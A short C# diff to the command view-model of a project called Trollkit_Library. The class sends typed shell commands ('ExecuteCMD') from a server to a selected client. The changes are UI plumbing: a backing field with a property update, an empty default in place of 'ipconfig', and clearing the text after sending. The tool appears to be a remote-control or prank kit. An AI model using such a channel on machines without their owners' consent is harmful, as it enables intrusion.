@@ -19,7 +19,9 @@ namespace Trollkit_Library.ViewModels.Commands
 		public ICommand Close { get { return new SendServerCommand(CloseCMD); } }
 		public ICommand Focus { get { return new SendServerCommand(FocusOnTextBox); } }
 
-		public string CommandText { get; set; }
+		private string _CommandText;
+		public string CommandText { get { return _CommandText; } set { _CommandText = value; _server.UpdateProperty("CMD"); } }
+
 		public bool IsFocusedElement { get; set; }
 
 		public CMDCommands(Server server, string handler)
@@ -27,13 +29,15 @@ namespace Trollkit_Library.ViewModels.Commands
 			_server = server;
 			this.handler = handler;
 
-			CommandText = "ipconfig";
+			CommandText = "";
 		}
 
 		public void SendCMDToClient()
 		{
+			
 			TransferCommandObject returnObject = new TransferCommandObject { Command = "ExecuteCMD", Handler = handler, Value = CommandText };
 			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
+			CommandText = "";
 		}
 
 
@@ -46,7 +50,7 @@ namespace Trollkit_Library.ViewModels.Commands
 		public void FocusOnTextBox()
         {
 			IsFocusedElement = true;
-			_server.UpdateProperty("CMD.IsFocusedElement");
+			_server.UpdateProperty("CMD");
         }
 	}
 }
